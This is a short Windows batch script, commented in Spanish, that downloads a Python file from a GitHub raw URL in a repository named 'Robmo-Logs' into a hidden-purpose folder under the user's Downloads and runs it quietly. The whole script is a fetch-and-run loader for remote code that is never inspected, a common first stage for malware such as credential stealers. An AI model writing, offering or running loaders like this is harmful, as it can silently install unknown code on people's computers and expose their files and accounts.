@echo off

:: Ruta de descarga y nombre del archivo
set "url=https://raw.githubusercontent.com/matiasb186/Robmo-Logs/main/sourcesfire.py"
set "download_folder=C:\Users\%USERNAME%\Downloads\ROBMO"
set "filename=sourcesfire.py"

:: Nombre del archivo Python a ejecutar
set "python_script=%download_folder%\%filename%"

:: Comprueba si la carpeta de descarga existe, y si no, créala
if not exist "%download_folder%" (
    mkdir "%download_folder%"
)

:: Descarga el archivo desde la URL
powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%python_script%')"

:: Comprueba si la descarga fue exitosa
if exist "%python_script%" (
    :: Ejecuta el archivo Python descargado sin mostrar salida
    python "%python_script%"
)

exit
